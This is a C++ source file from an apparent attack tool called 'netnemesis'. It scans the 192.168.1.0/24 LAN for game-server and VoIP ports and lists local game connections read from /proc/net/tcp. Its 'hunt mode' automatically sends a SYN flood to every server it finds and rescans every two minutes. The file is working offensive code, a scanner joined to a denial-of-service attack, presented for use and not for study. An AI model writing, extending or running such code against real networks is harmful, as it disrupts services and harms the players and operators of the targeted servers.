#include "netnemesis.h"
#include <future>
#include <chrono>
#include <fstream>
#include <iomanip>
#include <sstream>

std::atomic<bool> scanner_running(false);

NetworkScanner::NetworkScanner() {}

static std::string hexToIp(const std::string &hex) {
    if (hex.size() == 8) {
        std::string ip;
        for (int i = 0; i < 4; i++) {
            std::string byte = hex.substr(i * 2, 2);
            ip = std::to_string(std::stoi(byte, nullptr, 16)) + (i < 3 ? "." : "") + ip;
        }
        return ip;
    }

    if (hex.size() == 32) {
        struct in6_addr addr6;
        for (int i = 0; i < 16; i++) {
            std::string byte = hex.substr(i * 2, 2);
            addr6.s6_addr[i] = static_cast<unsigned char>(std::stoi(byte, nullptr, 16));
        }
        char buf[INET6_ADDRSTRLEN];
        if (inet_ntop(AF_INET6, &addr6, buf, sizeof(buf)) != nullptr) {
            return std::string(buf);
        }
    }

    return "";
}

static int hexToPort(const std::string &hex) {
    return std::stoi(hex, nullptr, 16);
}

std::vector<std::pair<std::string, int>> NetworkScanner::parseProcNetFile(const std::string &path) {
    std::vector<std::pair<std::string, int>> connections;
    std::ifstream file(path);
    if (!file.is_open()) return connections;

    std::string line;
    std::getline(file, line); // header
    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string sl, local_address, rem_address, st;
        if (!(iss >> sl >> local_address >> rem_address >> st)) continue;

        auto colonPos = local_address.find(':');
        if (colonPos == std::string::npos) continue;

        std::string localIpHex = local_address.substr(0, colonPos);
        std::string localPortHex = local_address.substr(colonPos + 1);
        std::string remoteIpHex = rem_address.substr(0, rem_address.find(':'));
        std::string remotePortHex = rem_address.substr(rem_address.find(':') + 1);

        int remotePort = hexToPort(remotePortHex);
        std::string remoteIp = hexToIp(remoteIpHex);

        // Only established connections to remote hosts
        if (st == "01") {
            connections.emplace_back(remoteIp, remotePort);
        }
    }
    return connections;
}

std::vector<std::pair<std::string, int>> NetworkScanner::collectLocalConnections() {
    auto tcp = parseProcNetFile("/proc/net/tcp");
    auto tcp6 = parseProcNetFile("/proc/net/tcp6");
    std::vector<std::pair<std::string, int>> connections;
    connections.insert(connections.end(), tcp.begin(), tcp.end());
    connections.insert(connections.end(), tcp6.begin(), tcp6.end());
    return connections;
}

std::vector<std::pair<std::string, int>> NetworkScanner::getConnections() {
    std::lock_guard<std::mutex> lock(connections_mutex);
    return local_connections;
}

std::string getGameName(int port) {
    switch(port) {
        case 27015: case 27016: case 27017: case 27018: case 27019: case 27020:
            return "Source Engine (CS:GO/TF2/CSS)";
        case 25565: return "Minecraft";
        case 7777: case 7778: return "Unreal Engine (ARK/etc)";
        case 27960: return "Quake 3 Arena";
        case 28960: return "Call of Duty";
        case 64738: return "Mumble/VoIP";
        case 27005: return "Source TV";
        default: return "Unknown Game";
    }
}

bool NetworkScanner::probePort(const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 200000; 
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    
    int result = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    close(sock);
    return (result == 0);
}

void NetworkScanner::scanRange(int start_host, int end_host, const std::vector<int> &ports, 
                               std::atomic<int> &progress, int total_hosts) {
    for (int host = start_host; host <= end_host && scanner_running && g_running; host++) {
        std::string ip = "192.168.1." + std::to_string(host);
        
        for (int port : ports) {
            if (!scanner_running) break; // Check the specific flag
            if (probePort(ip, port)) {
                std::string game = getGameName(port);
                {
                    std::lock_guard<std::mutex> lock(servers_mutex);
                    discovered_servers.push_back({ip, port});
                }
                Utils::logSuccess("\033[1m[SERVER FOUND]\033[0m " + game + 
                    " | IP: \033[36m" + ip + "\033[0m | Port: \033[33m" + 
                    std::to_string(port) + "\033[0m");
            }
        }
        progress++;
        
        if (host % 10 == 0) {
            int percent = (progress * 100) / total_hosts;
            std::lock_guard<std::mutex> lock(g_print_mutex);
            std::cout << "\r\033[34m[SCAN] Progress: " << percent << "% (" 
                      << progress << "/" << total_hosts << " hosts)\033[0m" << std::flush;
        }
    }
}

void NetworkScanner::scanLoop() {
    std::vector<int> game_ports = {
        27015, 27016, 27017, 27018, 27019, 27020,
        25565, 7777, 7778, 27960, 28960, 64738,
        27005, 27006, 27007, 27008, 27009, 27010
    };
    
    const int total_hosts = 254;
    const int num_threads = 10;
    
    while (g_running) { // Loop esterno controlla g_running
        std::atomic<int> progress(0);
        discovered_servers.clear();
        
        Utils::logInfo("Starting scan of network 192.168.1.0/24...");
        Utils::logInfo("Parallel threads: " + std::to_string(num_threads));
        std::cout << "\033[34m[SCAN] Progress: 0% (0/" << total_hosts << " hosts)\033[0m" << std::flush;
        
        auto local_sessions = collectLocalConnections();
        {
            std::lock_guard<std::mutex> lock(connections_mutex);
            local_connections.clear();
            for (auto &conn : local_sessions) {
                if (getGameName(conn.second) != "Unknown Game") {
                    local_connections.push_back(conn);
                }
            }
        }

        if (!local_connections.empty()) {
            Utils::logWarning("Local game connections detected:");
            for (const auto &conn : local_connections) {
                Utils::logInfo("  - " + getGameName(conn.second) + " | " + conn.first + ":" + std::to_string(conn.second));
            }
        }

        scanner_running = true;
        std::vector<std::thread> threads;
        int hosts_per_thread = total_hosts / num_threads;
        
        for (int i = 0; i < num_threads; i++) {
            int start = (i * hosts_per_thread) + 1;
            int end = (i == num_threads - 1) ? total_hosts : (start + hosts_per_thread - 1);
            threads.emplace_back(&NetworkScanner::scanRange, this, start, end, 
                                std::cref(game_ports), std::ref(progress), total_hosts);
        }
        
        for (auto &t : threads) {
            if (t.joinable()) t.join();
        }
        
        if (!scanner_running) {
            std::cout << std::endl;
            Utils::logInfo("Scanner stopped by user");
            return; // Exit the loop without terminating the program
        }
        
        std::cout << std::endl;
        Utils::logInfo("Scan completed. Servers found: " + 
            std::to_string(discovered_servers.size()));
        
        if (g_auto_hunt && !discovered_servers.empty()) {
            Utils::logWarning("HUNT MODE: Automatic attack...");
            for (const auto &server : discovered_servers) {
                PacketCrafter pc;
                pc.initialize();
                pc.sendSYNFlood(server.first, server.second, 100);
            }
        }
        
        Utils::logInfo("Next scan in 2 minutes...");
        for (int i = 0; i < 120 && g_running && scanner_running; i++) {
            sleep(1);
        }
    }
}

void NetworkScanner::start() {
    scan_thread = std::thread(&NetworkScanner::scanLoop, this);
}

void NetworkScanner::stop() {
    scanner_running = false; // Stop only the scanner, not g_running!
    if (scan_thread.joinable()) {
        scan_thread.join();
    }
}

std::vector<std::pair<std::string, int>> NetworkScanner::getServers() {
    std::lock_guard<std::mutex> lock(servers_mutex);
    return discovered_servers;
}